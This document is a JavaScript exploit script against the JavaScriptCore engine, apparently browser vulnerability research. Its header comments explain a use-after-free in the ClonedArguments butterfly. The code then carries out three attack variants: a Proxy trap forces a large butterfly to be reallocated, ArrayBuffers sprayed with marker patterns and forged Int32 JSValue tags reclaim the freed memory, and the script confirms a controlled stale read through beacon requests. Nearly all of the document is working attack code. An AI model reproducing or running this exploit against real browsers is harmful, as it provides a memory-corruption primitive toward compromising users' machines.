// p224 — ClonedArguments butterfly UAF: PreciseAllocation bypass
//
// BREAKTHROUGH: ButterflyInlines.h:209 — when the butterfly is large enough
// to be a PreciseAllocation (>~8KB), reallocArrayRightIfPossible uses
// tryFastRealloc → libpas synchronous free. This BYPASSES:
//   - GC auxiliary space (freed directly to libpas)
//   - Conservative stack scanning (libpas doesn't GC-scan)
//   - Type-segregated heaps (Gigacage disabled)
//
// Conditions for canRealloc=true:
//   1. propertyCapacity == 0 (ClonedArguments handles length/callee specially)
//   2. !mutatorShouldBeFenced() (no concurrent GC marking in progress)
//   3. isPreciseAllocation() (butterfly > MarkedBlock max cell size ~8KB)
//
// With 1200 elements: butterfly = IndexingHeader(8) + 1200*8 = 9608 bytes
// → PreciseAllocation → libpas realloc → old memory freed → spray reclaims
//
// Beacon prefix: V224-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V224-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  BS('BOOT');

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  // ---- TEST A: 1200-element PreciseAllocation butterfly ----
  try {
    BS('A-START');
    var NARGS = 1200;
    var trapCount = 0;
    var spray = [];

    var manyArgs = [];
    for (var a = 0; a < NARGS; a++) manyArgs.push(a + 1);
    var args = target.apply(null, manyArgs);
    BS('A-ARGS-' + NARGS);

    // Create holes for Proxy traps
    delete args[5];
    delete args[10];
    delete args[15];
    delete args[20];
    delete args[25];

    var trap = {
      get: function(t, prop) {
        trapCount++;
        if (trapCount === 1) {
          BS('A-TRAP-' + prop);

          // Grow butterfly — if PreciseAllocation, this goes through
          // tryFastRealloc → libpas realloc → old 9608 bytes FREED
          for (var j = NARGS; j < NARGS + 400; j++) args[j] = 0x41;
          BS('A-GREW');

          // Flush libpas dealloc log (batch size 100)
          // Small allocations to trigger TLC flush
          var flush = [];
          for (var f = 0; f < 200; f++) {
            flush.push(new ArrayBuffer(64));
          }
          flush = null;

          // Spray ArrayBuffers matching old butterfly size (9608 bytes)
          // libpas size class for 9608 → likely ~9616 or next class
          // Try several sizes near 9608 to hit the right class
          for (var s = 0; s < 2000; s++) {
            var ab = new ArrayBuffer(9600);
            var view = new Uint32Array(ab);
            // Fill with BEEF pattern — each 8-byte slot:
            // low32 = 0xBEEF0000 | slot_index, high32 = spray_id
            for (var k = 0; k < view.length; k += 2) {
              view[k] = 0xBEEF0000 | (k >> 1);
              view[k + 1] = (s & 0xFFFF);
            }
            spray.push(ab);
          }
          BS('A-SPRAYED-' + spray.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trap));

    var result;
    try {
      result = receiver.apply(null, args);
    } catch (e) {
      BS('A-ERR-' + e.message.substring(0, 30));
    }

    if (result) {
      BS('A-LEN-' + result.length);

      // Check first 100 non-hole positions for BEEF pattern
      var beefHits = 0;
      var nonOrig = 0;
      var holes = {5:1,10:1,15:1,20:1,25:1};
      for (var r = 0; r < Math.min(result.length, 100); r++) {
        if (holes[r]) continue;
        var val = result[r];
        if (typeof val === 'number') {
          var u = val >>> 0;
          if ((u >>> 16) === 0xBEEF) {
            beefHits++;
            if (beefHits <= 10) BS('A-HIT-' + r + '=' + hex(u));
          } else if (val !== (r + 1)) {
            nonOrig++;
            if (nonOrig <= 8) {
              var f64 = new Float64Array(1);
              f64[0] = val;
              var u32 = new Uint32Array(f64.buffer);
              BS('A-CHG' + r + '=' + hex(u32[1]) + '_' + hex(u32[0]));
            }
          }
        } else if (typeof val === 'object' && val !== null) {
          nonOrig++;
          BS('A-OBJ-' + r);
        } else if (val === undefined && !holes[r]) {
          nonOrig++;
          BS('A-UNDEF-' + r);
        }
      }
      BS('A-BEEF-' + beefHits);
      BS('A-NONORIG-' + nonOrig);

      // Dump values around first hole (positions 4,6,7,8)
      for (var h = 4; h <= 8; h++) {
        if (h === 5) continue;
        var v = result[h];
        var f64 = new Float64Array(1);
        f64[0] = (typeof v === 'number') ? v : 0;
        var u32 = new Uint32Array(f64.buffer);
        BS('A-V' + h + '=' + hex(u32[1]) + '_' + hex(u32[0]) + '_T' + typeof v);
      }
    }
  } catch (e) {
    BS('A-OUTER-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST B: JSValue-encoded spray ----
  // If realloc freed the old buffer, spray with int32-tagged JSValues
  // so the stale read interprets them as proper integers
  try {
    BS('B-START');
    var NARGS2 = 1200;
    var bTrap = 0;
    var bSpray = [];

    var bArgs = [];
    for (var a = 0; a < NARGS2; a++) bArgs.push(a + 1);
    var args2 = target.apply(null, bArgs);
    delete args2[3];
    delete args2[7];
    delete args2[11];

    var trap2 = {
      get: function(t, prop) {
        bTrap++;
        if (bTrap === 1) {
          BS('B-TRAP-' + prop);

          // Grow to trigger PreciseAllocation realloc
          for (var j = NARGS2; j < NARGS2 + 400; j++) args2[j] = 0x41;
          BS('B-GREW');

          // Flush TLC dealloc log
          var flush = [];
          for (var f = 0; f < 200; f++) flush.push(new ArrayBuffer(64));
          flush = null;

          // Spray with JSValue-encoded int32: 0xFFFE0000_DEAD00XX
          // On 64-bit JSC, Int32 tag = 0xFFFE0000 in upper 32 bits
          // The stale pointer reads raw 8-byte values as JSValues
          // If upper 32 = 0xFFFE0000, JSC interprets as int32
          for (var s = 0; s < 2000; s++) {
            var ab = new ArrayBuffer(9600);
            var v = new Uint32Array(ab);
            for (var k = 0; k < v.length; k += 2) {
              v[k] = 0xDEAD0000 | (k >> 1);   // payload
              v[k + 1] = 0xFFFE0000;           // Int32 tag
            }
            bSpray.push(ab);
          }
          BS('B-SPRAYED-' + bSpray.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args2, new Proxy({}, trap2));

    var result2;
    try {
      result2 = receiver.apply(null, args2);
    } catch (e) {
      BS('B-ERR-' + e.message.substring(0, 30));
    }

    if (result2) {
      BS('B-LEN-' + result2.length);

      var deadHits = 0;
      var bNonOrig = 0;
      var bHoles = {3:1,7:1,11:1};
      for (var r = 0; r < Math.min(result2.length, 100); r++) {
        if (bHoles[r]) continue;
        var val = result2[r];
        if (typeof val === 'number') {
          var u = val >>> 0;
          if ((u >>> 16) === 0xDEAD) {
            deadHits++;
            if (deadHits <= 10) BS('B-HIT-' + r + '=' + hex(u));
          } else if (val !== (r + 1)) {
            bNonOrig++;
            if (bNonOrig <= 5) {
              var f64 = new Float64Array(1);
              f64[0] = val;
              var u32 = new Uint32Array(f64.buffer);
              BS('B-CHG' + r + '=' + hex(u32[1]) + '_' + hex(u32[0]));
            }
          }
        } else if (typeof val !== 'number' && !bHoles[r]) {
          bNonOrig++;
          BS('B-WEIRD-' + r + '-T' + typeof val);
        }
      }
      BS('B-DEAD-' + deadHits);
      BS('B-NONORIG-' + bNonOrig);

      if (deadHits > 0) BS('B-CONTROLLED-READ-CONFIRMED');
    }
  } catch (e) {
    BS('B-OUTER-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST C: Even larger butterfly (2000 elements, ~16KB) ----
  // Extra safety margin for PreciseAllocation threshold
  try {
    BS('C-START');
    var NARGS3 = 2000;
    var cTrap = 0;
    var cSpray = [];

    var cArgs = [];
    for (var a = 0; a < NARGS3; a++) cArgs.push(a + 1);
    var args3 = target.apply(null, cArgs);
    delete args3[5];
    delete args3[10];

    var trap3 = {
      get: function(t, prop) {
        cTrap++;
        if (cTrap === 1) {
          BS('C-TRAP-' + prop);

          // Grow
          for (var j = NARGS3; j < NARGS3 + 600; j++) args3[j] = 0x41;
          BS('C-GREW');

          // Flush
          var flush = [];
          for (var f = 0; f < 200; f++) flush.push(new ArrayBuffer(64));
          flush = null;

          // Spray at 16008 bytes (2000*8 + 8 IndexingHeader)
          for (var s = 0; s < 1000; s++) {
            var ab = new ArrayBuffer(16000);
            var v = new Uint32Array(ab);
            for (var k = 0; k < v.length; k += 2) {
              v[k] = 0xCAFE0000 | (k >> 1);
              v[k + 1] = (s & 0xFFFF);
            }
            cSpray.push(ab);
          }
          BS('C-SPRAYED-' + cSpray.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args3, new Proxy({}, trap3));

    var result3;
    try {
      result3 = receiver.apply(null, args3);
    } catch (e) {
      BS('C-ERR-' + e.message.substring(0, 30));
    }

    if (result3) {
      BS('C-LEN-' + result3.length);

      var cafeHits = 0;
      var cNonOrig = 0;
      for (var r = 0; r < Math.min(result3.length, 100); r++) {
        if (r === 5 || r === 10) continue;
        var val = result3[r];
        if (typeof val === 'number') {
          var u = val >>> 0;
          if ((u >>> 16) === 0xCAFE) {
            cafeHits++;
            if (cafeHits <= 10) BS('C-HIT-' + r + '=' + hex(u));
          } else if (val !== (r + 1)) {
            cNonOrig++;
          }
        }
      }
      BS('C-CAFE-' + cafeHits);
      BS('C-NONORIG-' + cNonOrig);

      if (cafeHits > 0) BS('C-CONTROLLED-READ-CONFIRMED');
    }
  } catch (e) {
    BS('C-OUTER-ERR-' + e.message.substring(0, 40));
  }

  BS('DONE');
})();
